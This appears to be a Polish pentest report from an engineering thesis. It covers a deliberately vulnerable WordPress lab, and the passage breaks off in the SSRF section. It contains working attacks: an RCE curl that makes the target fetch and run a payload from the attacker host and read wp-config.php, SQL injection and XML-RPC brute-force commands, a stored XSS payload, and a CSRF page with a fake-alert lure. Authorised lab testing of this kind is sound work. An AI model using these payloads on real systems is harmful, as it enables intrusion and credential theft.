## Informacje o Projekcie

| **Nazwa Projektu**               | Analiza przykładowych podatności aplikacji webowej opartej na CMS WordPress z wykorzystaniem OWASP TOP 10 2025 i metodyki Penetration Testing Execution Standard |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Klient**                       | Praca inżynierska Uniwersytet Merito Poznań                                                                                                                      |
| **Testowany Obiekt (Aplikacja)** | Aplikacja "PracaInzynierskaBlog" (DVWP)<br>https://github.com/codelemdev/dvwp                                                                                    |
| **Zakres (Scope)**               | Host: `192.168.56.1`, port: `31337`<br>Aplikacja webowa WordPress.                                                                                               |
| **Elementy Wyłączone z Zakresu** | Ataki DoS (Denial of Service), ataki na infrastrukturę, ataki fizyczne.                                                                                          |
| **Zespół Testujący**             | `[emlemmy](https://github.com/emlemmy)`                                                                                                               |
| **Data Rozpoczęcia**             | 2025-10-8                                                                                                                                                        |
| **Data Zakończenia**             | 2025-12-9                                                                                                                                                        |


## FAZA 1: Faza Wstępna (Pre-engagement Interactions)
_Niniejsza sekcja stanowi podsumowanie kluczowych ustaleń umownych._

- **Podstawa Formalna (Zgody i Upoważnienia):** Projekt realizowany w ramach pracy inżynierskiej na środowisku laboratoryjnym (Docker). Zgoda domniemana (własne środowisko).
    
- **Cele Strategiczne Testu:**
    1. Identyfikacja krytycznych podatności w przestarzałych komponentach WordPress.
    2. Weryfikacja możliwości zdalnego wykonania kodu (RCE).
    3. Ocena ryzyka przejęcia kont użytkowników.
    
- **Warunki Realizacji Testu (Rules of Engagement):**
    - **Harmonogram Prac Testowych:** Testy realizowane laboratoryjnie w środowiskach lokalnych testerów.
    - **Procedura Postępowania z Danymi Wrażliwymi:** Wszelkie pozyskane hashe lub dane z bazy testowej pozostają jedynie w raporcie.

## FAZA 2: Rozpoznanie i Gromadzenie Informacji (Intelligence Gathering)
_Rejestr informacji zebranych na temat obiektu testów._

### 2.1. Rozpoznanie Pasywne (OSINT)

_Uwaga: Testy prowadzone w sieci wewnętrznej oraz techniki OSINT oparte o indeksowanie publiczne mają ograniczone zastosowanie ze względu na charakter testów_

- **Analiza Rekordów DNS:** Środowisko lokalne (rozwiązywanie nazw via `/etc/hosts` lub bezpośredni adres IP).
- **WHOIS:** Nie dotyczy (adres prywatny klasy C z puli RFC1918).

### 2.2. Rozpoznanie Aktywne (Skanowanie)

- **Skanowanie Portów i Usług (Nmap):**
    
    ```bash
    # Użyta komenda Nmap
    nmap --privileged -sV -sC -p 31337 -oN nmap-wyniki.txt 192.168.56.1
    
    # Zidentyfikowane otwarte porty i usługi
    PORT      STATE SERVICE VERSION
    31337/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-title: PracaInzynierskaBlog &#8211; This site is about cybersecurity 
    |_http-generator: WordPress 5.3 
    |_http-server-header: Apache/2.4.38 (Debian) 
    MAC Address: 00:15:5D:01:47:02 (Microsoft)
    ```
    
- **Identyfikacja Stosu Technologicznego (WhatWeb):**
    
    - **CMS:** WordPress 5.3 (Wersja niewspierana, EOL)
    - **Serwer WWW:** Apache/2.4.38 (Debian)
    - **Backend:** PHP/7.1.33 (Wersja niewspierana)
    - **System Operacyjny:** Debian Linux
        
- **Enumeracja Specyficzna dla Platformy WordPress (WPScan):**
    
    - Użyta komenda:
        ```bash
        wpscan --url 192.168.56.1 --api-token [*REDACTED*] --enumerate u,p,t,vp,vt --force --output wpscan_results.json
        ```
        
    - **Wersja WordPress Core:** `5.3` (Status: `Insecure`, 57 zidentyfikowanych podatności w rdzeniu).
        
    - **Zidentyfikowane Wtyczki (Plugins):**
    
      | Nazwa Wtyczki | Wersja | Podatności (z WPScan) | CVE |
      | --- | --- | --- | --- |
      | `social-warfare` | 3.5.2 | **RCE (Unauthenticated), Arbitrary Settings Update** | CVE-2019-9978 |
      | `wp-advanced-search` | 3.3.3 | **SQL Injection, CSRF, RCE** | CVE-2020-12104 |
      | `wp-file-upload` | 4.12.2 | **Arbitrary File Upload (RCE)** | CWE-434 |
      
    - **Zidentyfikowane Motywy (Themes):**
    
      | Nazwa Motywu | Wersja | Podatności (z WPScan) |
      | --- | --- | --- |
      | `twentytwenty` | 1.0 | Nieaktualna (najnowsza wersja: 2.9) |
        
    - **Enumeracja Użytkowników:**
    
      | ID | Login (slug) | Nazwa Wyświetlana |
      | --- | --- | --- |
      | - | `konrad-138531` | konrad-138531 |
      | - | `kowal321` | kowal321 |
      | - | `marcinek21` | marcinek21 |
        
    - **Pozostałe wyniki skanowania WPScan:**
      - Aktywny interfejs XML-RPC (`/xmlrpc.php`).
      - Dostępny plik `readme.html` (ujawnia wersję).
      - Aktywny zewnętrzny WP-Cron.

## FAZA 3: Modelowanie Zagrożeń (Threat Modeling)
_Selekcja podatności do szczegółowej weryfikacji w kontekście OWASP Top 10 (2025)._

- **Identyfikacja Kluczowych Aktywów (Assets):**
	1. **Poufność:** Baza danych (dane osobowe, hashe haseł użytkowników).
	2. **Integralność:** System plików serwera (pliki PHP, konfiguracja wp-config.php).
	3. **Dostępność:** Panel administracyjny `/wp-admin`, usługa www.

- **Definicja Aktorów Zagrożeń (Threat Actors):**
	1. Atakujący zewnętrzny (bez poświadczeń) - skrypty automatyczne.
	2. Atakujący wewnętrzny (via compromised account) - eskalacja uprawnień.

- **Mapa Wektorów Ataku (OWASP Top 10 2025 Mapping):**

| ID       | Kategoria OWASP 2025                          | Podatność                               | Komponent Docelowy                               | Cel Techniczny Ataku                                                      |
| :------- | :-------------------------------------------- | :-------------------------------------- | :----------------------------------------------- | :------------------------------------------------------------------------ |
| **V-01** | **A03:2025 – Injection**                      | **Remote Code Execution (RCE)**         | Wtyczka `social-warfare` v3.5.2                  | Uzyskanie powłoki systemowej (reverse shell).                             |
| **V-02** | **A03:2025 – Injection**                      | **SQL Injection (SQLi)**                | Wtyczka `wp-advanced-search` v3.3.3              | Ekstrakcja danych uwierzytelniających z DB.                               |
| **V-03** | **A07:2025 – Identification & Auth Failures** | **Brute Force (XML-RPC)**               | WordPress Core `XML-RPC`                           | Złamanie hasła użytkownika `kowal321`.                                    |
| **V-04** | **A03:2025 – Injection**                      | **Stored Cross-Site Scripting (XSS)**   | WordPress Core 5.3 / Komentarze                  | Wstrzyknięcie złośliwego kodu przez użytkownika anonimowego (Bypass filtrów).               |
| **V-05** | **A05:2025 – Security Misconfiguration**      | **Sensitive Data Exposure (User Enum)** | REST API (`/wp/v2/users`)                        | Enumeracja loginów użytkowników (ułatwienie ataku brute force).           |
| **V-06** | **A01:2025 – Broken Access Control**          | **Cross-Site Request Forgery (CSRF)**   | Wtyczka `wp-advanced-search` v3.3.3              | Nieautoryzowana zmiana ustawień (Eskalacja przywilejów dla ról niższych). |
| **V-07** | **A10:2025 – Server-Side Request Forgery**    | **Blind SSRF**                          | WordPress Core `XML-RPC`                         | Skanowanie portów wewnętrznej infrastruktury.                             |
| **V-08** | **A04:2025 – Insecure Design** | **Arbitrary File Upload (RCE)** | Wtyczka `wp-file-upload`<br>Strona /rekrutacja | Wgranie interaktywnej powłoki systemowej (Web Shell) i przejęcie serwera. |

## FAZA 4: Analiza Podatności (Vulnerability Analysis)
_Weryfikacja istnienia podatności._

### 4.1. V-01: RCE w Social Warfare (CVE-2019-9978)
- **Status:** Zweryfikowano obecność podatnej wersji (3.5.2).
- **Opis:** Wtyczka nieprawidłowo parsuje parametr `swp_url` w funkcji `swp_track_click`.
- **Weryfikacja:** Dostępny endpoint `/wp-admin/admin-post.php` przyjmuje parametr `swp_url`. Wersja wtyczki 3.5.2 jest podatna.

### 4.2. V-02: SQL Injection w WP Advanced Search (CVE-2020-12104)
- **Status:** Zweryfikowano obecność podatnej wersji (3.3.3).
- **Opis:** Brak sanityzacji parametrów w zapytaniach `WP_Query` generowanych przez wtyczkę.
- **Weryfikacja:** Wstrzyknięcie znaku `'` w parametrze wyszukiwania powoduje błąd bazy danych widoczny w odpowiedzi HTTP (Error-Based SQLi).

### 4.3. V-03: Słabe Uwierzytelnianie (XML-RPC)
- **Status:** Potwierdzono aktywność `xmlrpc.php` i istnienie użytkownika `kowal321`.
- **Opis:** Interfejs XML-RPC pozwala na wielokrotne próby logowania w jednym żądaniu HTTP (bypass limitów).
- **Weryfikacja:** Serwer odpowiada na żądania POST do `/xmlrpc.php`. Metoda `system.listMethods` zwraca listę dostępnych funkcji.

### 4.4. V-04: Stored XSS (Unauthenticated) (CVE-2019-20041)
- **Status:** Potwierdzono podatność na ominięcie filtrów sanityzujących (Sanitization Bypass).
- **Opis:** Wersja WordPress 5.3 posiada błąd w funkcji `wp_kses_bad_protocol()`, która odpowiada za czyszczenie niebezpiecznych protokołów (jak `javascript:`) z linków. Funkcja ta niepoprawnie obsługuje nazwane encje HTML5 (w szczególności `&colon;`).
- **Weryfikacja:** Wysłanie komentarza zawierającego spreparowany link `<a href="javascript&colon;alert(1)">` przez użytkownika niezalogowanego skutkuje zapisaniem go w bazie danych w formie, która jest interpretowana przez przeglądarkę jako kod wykonywalny, omijając mechanizmy bezpieczeństwa WordPressa.

### 4.5. V-05: Sensitive Data Exposure (REST API)
- **Status:** Zweryfikowano aktywnie.
- **Opis:** Domyślna konfiguracja REST API w WordPress (< 4.7.1 oraz nowsze bez dodatkowych zabezpieczeń) udostępnia endpoint `/wp/v2/users`, który pozwala na enumerację użytkowników poprzez identyfikację ich ID oraz loginów (slug).
- **Weryfikacja:** Wykonano zapytanie do API, które zwróciło obiekt JSON zawierający pełne loginy (slug) użytkowników, co ułatwia ataki słownikowe. Konfiguracja bez "Pretty Permalinks" nie zabezpiecza przed dostępem do API.

### 4.6. V-06: Cross-Site Request Forgery (CSRF)
- **Status:** Potwierdzono (Podatność we wtyczce WP Advanced Search < 3.3.9).
- **Opis:** Funkcje administracyjne wtyczki odpowiedzialne za zapisywanie ustawień nie weryfikują tokenów nonce. Umożliwia to wymuszenie na zalogowanym administratorze zmiany konfiguracji poprzez nieświadome wysłanie żądania POST z zewnętrznej witryny.
- **Weryfikacja:** Analiza kodu HTML formularza ustawień wtyczki wykazała, że żądania zmiany ustawień są akceptowane bez unikalnych tokenów sesyjnych w ciele żądania. Brak lub niepoprawna weryfikacja pola `_wpnonce` przy zapisie konfiguracji globalnej.

### 4.7. V-07: Server-Side Request Forgery (SSRF)
- **Status:** Potwierdzono (blind).
- **Opis:** Aplikacja jest podatna na atak DNS Rebinding w mechanizmie XML-RPC/Pingback, co pozwala wymusić na serwerze wykonanie żądania HTTP do sieci wewnętrznej (np. do innych kontenerów Docker lub hosta).
- **Weryfikacja:** Wywołanie metody `pingback.ping` z adresem zwrotnym (localhost) zwraca pozytywny kod błędu (faultCode), co sugeruje próbę połączenia przez serwer.

### 4.8. V-08: Unauthenticated File Upload (RCE)
- **Status:** Zweryfikowano obecność formularza i podatnej konfiguracji.
- **Opis:** Wtyczka `wp-file-upload` w wersji 4.12.2 posiada znane słabości związane z walidacją plików (CWE-434). Dodatkowo, wykryto publicznie dostępny formularz na podstronie `/rekrutacja`, który nie wymaga uwierzytelniania.
- **Weryfikacja:**
    1. Potwierdzono wersję wtyczki (4.12.2) poprzez analizę plików źródłowych strony (`readme.txt` / nagłówki HTTP).
    2. Zidentyfikowano aktywny formularz uploadu dostępny dla użytkownika "Gość".
    3. Wstępna analiza wykazała brak mechanizmów CSRF chroniących formularz oraz akceptowanie plików o różnych rozszerzeniach.

## FAZA 5: Eksploatacja Podatności (Exploitation)
_Rejestr potwierdzonych i pomyślnie wykorzystanych podatności._
### Rejestr Ustaleń (Findings Log)

| ID | Podatność | Klasyfikacja (CVE/CWE) | Kategoria OWASP 2025 | CVSS v4.0 Score | Poziom Ryzyka | Status Eksploatacji |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **V-01** | **RCE**<br>(Social Warfare) | CVE-2019-9978 | A03:2025 – Injection | **9.3** | **Krytyczny** | **Sukces**<br>(Uzyskano dostęp do `wp-config.php`) |
| **V-02** | **SQL Injection** (WP Advanced Search) | CVE-2020-12104 | A03:2025 – Injection | **9.3** | **Krytyczny** | **Sukces**<br>(Ekstrakcja nazwy bazy danych) |
| **V-03** | **Brute Force** (XML-RPC) | CWE-307 | A07:2025 – Identification & Auth Failures | **6.9** | **Średni** | **Sukces**<br>(Przejęcie konta `kowal321`) |
| **V-04** | **Stored XSS** (Komentarze) | CVE-2019-20041 | A03:2025 – Injection | **5.1** | **Średni** | **Sukces**<br>(Wstrzyknięcie kodu JS) |
| **V-05** | **Sensitive Data Exposure**<br>(REST API) | CWE-200 | A05:2025 – Security Misconfiguration | **6.9** | **Średni** | **Sukces**<br>(Ujawniono login administratora) |
| **V-06** | **CSRF** <br>(WP Advanced Search) | CVE-2022-47447 | A01:2025 – Broken Access Control | **5.3** | **Średni** | **Sukces**<br>(Wymuszono obniżenie zabezpieczeń) |
| **V-07** | **Blind SSRF** (XML-RPC) | CVE-2022-3590 | A10:2025 – Server-Side Request Forgery | **6.0** | **Średni** | **Sukces**<br>(Potwierdzono metodą Blind) |
| **V-08** | **Arbitrary File Upload (RCE)** | CWE-434 | A04:2025 – Insecure Design | **9.3** | **Krytyczny** | **Sukces**<br>(Wgrano GUI Web Shell) |

### V-01: RCE w Social Warfare - A03:2025 – Injection

- **ID:** V-01

- **CVE:** CVE-2019-9978

- **Podatność:** Remote Code Execution (RCE) / Unauthenticated Arbitrary Settings Update

- **CVSS v4.0 Score:** 9.3 (Critical)

- **Wektor CVSS:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

- **Lokalizacja:** `/wp-admin/admin-post.php` (parametry GET: `swp_debug`, `swp_url`)

- **Opis:** Wtyczka Social Warfare w wersji 3.5.2 niewłaściwie obsługuje parametry wejściowe w nieudokumentowanej funkcji debugowania. Aplikacja przyjmuje zewnętrzny adres URL w parametrze `swp_url`, pobiera jego zawartość, a następnie parsuje ją przy użyciu funkcji `eval()` bez odpowiedniej sanityzacji. Pozwala to atakującemu na wstrzyknięcie i wykonanie dowolnego kodu PHP w kontekście użytkownika serwera WWW.

- **Dowód Koncepcji (PoC) - Weryfikacja Automatyczna:**
	Skaner WPScan zidentyfikował zainstalowaną wtyczkę `social-warfare` w wersji `3.5.2` oraz powiązał ją ze znaną podatnością RCE.
	
	*Fragment raportu WPScan:*
	```json
	[!] Title: Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
	    Fixed in: 3.5.3
	    References:
	     - [https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618]
	```

- **PoC - weryfikacja manualna:** Przeprowadzono udany atak, wymuszając na serwerze ofiary pobranie złośliwego pliku `payload.txt` z maszyny atakującego (`192.168.56.101`).
	
	1. **Przygotowanie payloadu:** Utworzono plik zawierający komendę systemową: `<pre>system('id')</pre>`.
	2. **Wykonanie ataku:** Wysłano spreparowane żądanie HTTP.

	*Komenda:*
	```bash
	curl "http://192.168.56.1:31337/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.56.101:8000/payload.txt"
	```
	
	*Rezultat (Dowód wykonania kodu):*
	```bash
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	```
- **Dowód wizualny (id):**
	![Błąd wyświetlania](/screenshots/PoC-RCE-SocialWarfare-id.png)

- **Dowód wizualny (wp-config):**
  ![Błąd wyświetlania](/screenshots/PoC-RCE-SocialWarfare-wp-config.png)

- **Wynik (Eskalacja):** Potwierdzono pełne wykonanie kodu (RCE). W ramach post-eksploatacji zmodyfikowano payload do postaci `system('cat ../wp-config.php')`, co pozwoliło na odczyt pliku konfiguracyjnego WordPress.
	
	*Ujawnione poświadczenia:*
	- DB_NAME: `wordpress`
	- DB_USER: `root` (Naruszenie zasady Least Privilege)
	- DB_PASSWORD: `password`

- **Ryzyko:** Krytyczne. Podatność pozwala na całkowite przejęcie kontroli nad serwerem aplikacji. Ujawnienie poświadczeń użytkownika `root` do bazy danych umożliwia atakującemu nie tylko kradzież danych, ale potencjalnie dalszą eskalację uprawnień w systemie operacyjnym (poprzez funkcje bazy danych operujące na plikach).

### V-02: SQL Injection - A03:2025 – Injection

- **ID:** V-02

- **CVE:** CVE-2020-12104

- **Podatność:** SQL Injection (Error-Based)

- **CVSS v4.0 Score:** 9.3 (Critical)

- **Wektor CVSS:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

- **Lokalizacja:** `/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php` (parametr GET: `f`)

- **Opis:** Parametr `f` nie jest poddawany odpowiedniej sanityzacji. Aplikacja podatna jest na wstrzykiwanie kodu SQL, który jest wykonywany przez bazę danych, a wyniki zwracane są w komunikatach błędów (XPATH syntax error).

- **Dowód Koncepcji (PoC) - Weryfikacja Automatyczna:** Potwierdzono podatność narzędziem `sqlmap` z wymuszeniem techniki Error-Based.

	*Komenda:*
	```bash
	sqlmap -u "http://192.168.56.1:31337/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=test&f=user_login&t=wp_users" -p f --technique=E --dbms=mysql --current-db --flush-session --batch
	```
	
	*Rezultat:*
	```bash
	[INFO] retrieved: wordpress
	```

- **Dowód wizualny:**
	![Błąd wyświetlania](/screenshots/PoC-SQLi.png)

- **PoC - weryfikacja manualna:** Wstrzyknięto zapytanie wykorzystujące funkcję `extractvalue()`, zmuszając bazę do ujawnienia swojej nazwy.

	*Payload:*
	```bash
	user_login AND extractvalue(1,concat(0x3a,database()))
	```
	*Komenda:*
	```bash
	curl "http://192.168.56.1:31337/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=test&f=user_login%20AND%20extractvalue(1,concat(0x3a,database()))&t=wp_users"
	```
	*Rezultat:*
	```bash
	Erreur : XPATH syntax error: ':wordpress'
	```

- **Wynik:** Pomyślnie zidentyfikowano silnik bazy danych (MySQL) oraz nazwę bieżącej bazy (`wordpress`).

- **Ryzyko:** Krytyczne. Możliwość nieautoryzowanego odczytu danych z bazy, co może prowadzić do kradzieży tożsamości administratorów i przejęcia serwisu.

### V-03: Brute Force (XML-RPC) - A07:2025 – Identification & Auth Failures

- **ID:** V-03
	
- **CWE:** CWE-307: Improper Restriction of Excessive Authentication Attempts
	
- **Podatność:** Password Brute Force via XML-RPC API

- **CVSS v4.0 Score:** 6.9 (Medium)

- **Wektor CVSS:** `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
    
- **Lokalizacja:** `/xmlrpc.php` (Metoda API: `wp.getUsersBlogs` lub `system.multicall`)
    
- **Opis:** Interfejs XML-RPC w WordPress domyślnie pozwala na zdalne wywoływanie procedur, w tym tych wymagających uwierzytelniania. Mechanizm ten często nie posiada tych samych limitów prób logowania (rate-limiting) co standardowy formularz `wp-login.php`. Umożliwia to atakującemu przeprowadzanie szybkich ataków słownikowych (Brute Force) w celu odgadnięcia haseł użytkowników.
    
- **Dowód Koncepcji (PoC) - Weryfikacja Automatyczna:** Wykorzystano narzędzie WPScan z modułem ataku na XML-RPC oraz przygotowany słownik haseł, celując w zidentyfikowanego wcześniej użytkownika `kowal321`.
  
   
    _Komenda:_   
    ```bash
     wpscan --url http://192.168.56.1:31337 --usernames kowal321 --passwords wordlist.txt --password-attack xmlrpc
    ```
    
    _Rezultat:_    
    ```bash
     [+] Performing password attack on Xmlrpc against 1 user/s
     [SUCCESS] - kowal321 / password
    ```
        
- **PoC - weryfikacja manualna (Curl):** Aby potwierdzić działanie interfejsu bez dedykowanych narzędzi, wysłano surowe żądanie HTTP POST z payloadem XML, próbując uwierzytelnić się znalezionym hasłem.
    
    _Payload XML (body):_   
    ```xml
     <methodCall>
       <methodName>wp.getUsersBlogs</methodName>
       <params>
         <param><value>kowal321</value></param>
         <param><value>password</value></param>
       </params>
     </methodCall>
    ```
    
    _Komenda:_
    ```bash
     curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>kowal321</value></param><param><value>password</value></param></params></methodCall>" http://192.168.56.1:31337/xmlrpc.php
    ```
    
    _Rezultat:_ Serwer zwrócił poprawną odpowiedź XML (zamiast błędu 403/Login Failed), potwierdzając przejęcie konta.
    
- **Dowód wizualny:**
  ![Błąd wyświetlania](/screenshots/PoC-XMLRPC-BruteForce.png)

- **Wynik:** Pomyślnie złamano hasło użytkownika.
    
    - Login: `kowal321`
        
    - Hasło: `password`
        
- **Ryzyko:** Wysokie. Przejęcie konta użytkownika pozwala na dostęp do panelu WordPress. W zależności od uprawnień konta (np. Redaktor, Administrator), atakujący może modyfikować treści, instalować złośliwe wtyczki lub eskalować uprawnienia. Brak ochrony XML-RPC sprawia, że silne hasła mogą zostać złamane w krótszym czasie niż przy ataku na formularz webowy.
### V-04: Stored XSS - A03:2025 - Injection

- **ID:** V-04
	
- **CVE:** CVE-2019-20041 (Bypass filtru wp_kses)

- **Podatność:** Stored Cross-Site Scripting (XSS) via Comment Section

- **CVSS v4.0 Score:** 5.1 (Medium)

- **Wektor CVSS:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N`

- **Lokalizacja:** Formularz komentarzy (dostępny publicznie dla gości).

- **Opis:**
  Zidentyfikowano błąd w mechanizmie sanityzacji danych wejściowych WordPress (`wp_kses`). Aplikacja w wersji 5.3 nieprawidłowo przetwarza encje HTML5 (w tym `&colon;` jako dwukropek). Pozwala to niezalogowanemu atakującemu na wstrzyknięcie złośliwego protokołu `javascript:` do atrybutu `href` w tagu linku. Payload jest trwale zapisywany w bazie danych i serwowany każdemu użytkownikowi (w tym administratorowi), który odwiedzi zainfekowany wpis.
	
- **Dowód Koncepcji (PoC) - Weryfikacja Manualna:**
  1.  Jako użytkownik anonimowy (niezalogowany), nawigowano do sekcji komentarzy dowolnego wpisu.
  2.  Wysłano komentarz zawierający payload wykorzystujący technikę "Colon Bypass":
      ```html
      <a href="javascript&colon;alert('XSS_BYPASS_SUKCES')">...</a>
      ```
  3.  Filtr `wp_kses` nie wykrył zagrożenia, ponieważ nie rozpoznał ciągu `javascript&colon;` jako zakazanego protokołu.
  4.  Serwer zapisał komentarz i wygenerował odpowiedź HTML zawierającą wstrzyknięty kod.

- **Dowód wizualny (Source Code Verification):**
  Poniższy zrzut ekranu przedstawia analizę kodu źródłowego (DOM Inspector) po opublikowaniu komentarza. Widoczny jest atrybut `href` zawierający wstrzyknięty kod, co potwierdza udany atak typu Injection po stronie serwera.
  
  ![Błąd wyświetlania](/screenshots/PoC-XSS.png)

- **Wynik:** Potwierdzono możliwość trwałego zapisu niebezpiecznego kodu JavaScript w bazie danych przez osobę niepowołaną.
  *Adnotacja techniczna: W trakcie testów nowoczesna przeglądarka (Firefox) zastosowała mechanizm obronny, interpretując błędnie sformatowany protokół jako względną ścieżkę URL (błąd 404), jednak nie neguje to faktu, że serwer przyjął i udostępnił złośliwy ładunek (Vulnerable Backend).*

- **Ryzyko:** Wysokie.
  Atak nie wymaga uwierzytelniania. Skuteczne wykorzystanie podatności (np. wobec ofiary używającej starszej przeglądarki lub przy użyciu bardziej złożonego payloadu poliglota) może prowadzić do przejęcia sesji administratora, przekierowania użytkowników na witryny phishingowe lub modyfikacji treści serwisu.

### V-05: Sensitive Data Exposure (User Enumeration) - A05:2025 – Security Misconfiguration

- **ID:** V-05
- **CWE:** CWE-200: Exposure of Sensitive Information to Unauthorized Actor
- **CVSS v4.0 Score:** 6.9 (Medium)
- **Wektor CVSS:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Podatność:** User Enumeration via REST API
- **Lokalizacja:** `/index.php?rest_route=/wp/v2/users`
- **Opis:** Aplikacja posiada domyślnie włączony interfejs REST API, który nie wymaga uwierzytelniania do odczytu listy użytkowników. Endpoint `/wp/v2/users` zwraca pełną listę kont zarejestrowanych w systemie, w tym pole `slug`, które w WordPressie odpowiada loginowi użytkownika. Pozwala to atakującemu na przeprowadzenie ukierunkowanego ataku siłowego (typu Brute Force) bez konieczności zgadywania nazw użytkowników.
- **Dowód Koncepcji (PoC):** Wymuszono ujawnienie danych poprzez zapytanie GET do API, uwzględniając specyficzną konfigurację permalinków (parametr `rest_route`).

  *Komenda:*
  ```bash
  curl -s "http://192.168.56.1:31337/index.php?rest_route=/wp/v2/users" | python3 -m json.tool
  ```
	*Rezultat:*
	```json
	[
    {
        "id": 1,
        "name": "konrad 138531",
        "url": "",
        "description": "",
        "link": "http://192.168.56.1:31337/?author=1",
        "slug": "konrad-138531",
        "meta": [],
        "_links": {
            "self": [
                {
                    "href": "http://192.168.56.1:31337/index.php?rest_route=/wp/v2/users/1"
                }
            ],
            "collection": [
                {
                    "href": "http://192.168.56.1:31337/index.php?rest_route=/wp/v2/users"
                }
            ]
        }
    }
  ]
	```

- **Wnioski:** Ujawniono login administratora: `konrad-138531`.
    
- **Ryzyko:** Średnie. Ujawnienie loginów drastycznie zmniejsza złożoność ataku słownikowego na hasła.


### V-06: Cross-Site Request Forgery (CSRF) - A01:2025 – Broken Access Control

- **ID:** V-06
    
- **CVE:** CVE-2022-47447
    
- **Podatność:** Cross-Site Request Forgery (CSRF) prowadzące do zmiany konfiguracji ACL.

- **CVSS v4.0 Score:** 5.3 (Medium)

- **Wektor CVSS:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N`
    
- **Lokalizacja:** `/wp-admin/admin.php?page=wp-advanced-search` (Funkcja zapisu ustawień `wpas_save_settings`)
    
- **Opis:** Wtyczka WP Advanced Search w wersji 3.3.3 nie implementuje mechanizmu weryfikacji tokenów anty-CSRF (nonce) w procesie zapisywania konfiguracji. Pozwala to atakującemu na przygotowanie złośliwej witryny, która w imieniu uwierzytelnionego administratora wymusza wysłanie żądania HTTP POST zmieniającego kluczowe ustawienia wtyczki.
    
- **Dowód Koncepcji (PoC):** Przeprowadzono symulowany atak z wykorzystaniem zewnętrznego serwera kontrolowanego przez atakującego (Kali Linux). Celem ataku była zmiana parametru `wpas_capability` (określającego minimalne uprawnienia do zarządzania wtyczką) z domyślnego `manage_options` (Tylko Admin) na `read` (Każdy zalogowany użytkownik).
    
    1. **Przygotowanie (Kali Linux):** Utworzono plik `csrf-payload.html` zawierający ukryty formularz HTML oraz skrypt JS. Zastosowano technikę inżynierii społecznej (fałszywy alert bezpieczeństwa - Pretexting), aby ukryć przed ofiarą rzeczywisty przebieg ataku i uśpić jej czujność na czas przekierowania.
        
    2. **Dostarczenie:** Administrator będący ofiarą odwiedził link do zasobu (`http://192.168.56.101:8000/csrf-payload.html`).
        
    3. **Eksploatacja:** Przeglądarka ofiary automatycznie wysłała żądanie POST do panelu WordPress w tle wyświetlanego komunikatu.
        
    
    _Zastosowany Payload (csrf-payload.html):_
    
    ```html
    <html>
      <body>
        <div style="text-align:center; margin-top:50px;">
            <h1 style="color:red; font-size:50px;">SYSTEM ALERT!</h1>
            <h3>Zablokowano atak na instalację Wordpress!</h3>
            <p>Trwa skanowanie bezpieczeństwa... Proszę czekać... Trwa przekierowanie do panelu administracyjnego WordPress...</p>
            <img src="https://i.gifer.com/VAyR.gif" />
        </div>
        <!--> Ukryty formularz <--->
        <form action="http://192.168.56.1:31337/wp-admin/admin.php?page=wp-advanced-search" method="POST" id="csrf-form">
          <input type="hidden" name="wpas_capability" value="read" />
          <input type="hidden" name="wpas_save_settings" value="1" />
        </form>
    
        <script>
        // Opóźnienie 3 sekundy, aby ofiara zdążyła przeczytać fałszywy komunikat
          setTimeout(function() {
            document.getElementById("csrf-form").submit();
          }, 3000);
        </script>
      </body>
    </html>
    ```
    
- **Weryfikacja Skutków (State Change):** Po przeprowadzeniu ataku zalogowano się na konto zwykłego użytkownika (nieposiadającego uprawnień administratora). Potwierdzono, że użytkownik ten uzyskał nieautoryzowany dostęp do panelu konfiguracyjnego wtyczki WP Advanced Search, co przed atakiem było niemożliwe (menu wtyczki pojawiło się w kokpicie).
    
- **Ryzyko:** Średnie/Wysokie. Podatność pozwala na nieautoryzowaną modyfikację konfiguracji. W tym przypadku zademonstrowano sabotaż mechanizmu kontroli dostępu (Broken Access Control), co eksponuje funkcje administracyjne wtyczki dla użytkowników o niskich uprawnieniach. Może to posłużyć jako punkt wyjścia do dalszych ataków (np. jeśli panel wtyczki posiada luki XSS lub SQLi, są one teraz dostępne dla szerszego grona atakujących).

### V-07: Blind Server-Side Request Forgery (XML-RPC) - A10:2025 – Server-Side Request Forgery

- **ID:** V-07
    
- **CVE:** CVE-2022-3590
    
- **Podatność:** Blind Server-Side Request Forgery (SSRF)

- **CVSS v4.0 Score:** 6.0 (Medium)

- **Wektor CVSS:** `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`
    
- **Lokalizacja:** `/xmlrpc.php` (Metoda API: `pingback.ping`)
    
- **Opis:** Funkcja `pingback.ping` w interfejsie XML-RPC nie posiada wystarczającej walidacji adresów IP podawanych w parametrze `source`. Aplikacja akceptuje adresy z puli prywatnej (np. `127.0.0.1` lub `192.168.x.x`). W badanej konfiguracji podatność ma charakter "Blind" (ślepy) – serwer przyjmuje żądanie połączenia z siecią wewnętrzną i zwraca status sukcesu (`faultCode 0`) niezależnie od stanu portu docelowego, nie ujawniając w odpowiedzi treści błędów połączenia.
    
- **Dowód Koncepcji (PoC):** Wysłano spreparowane żądanie XML nakazujące serwerowi połączenie się z własnym interfejsem localhost (`127.0.0.1`) na losowym, zamkniętym porcie.
    
    _Payload XML:_
    
    ```xml
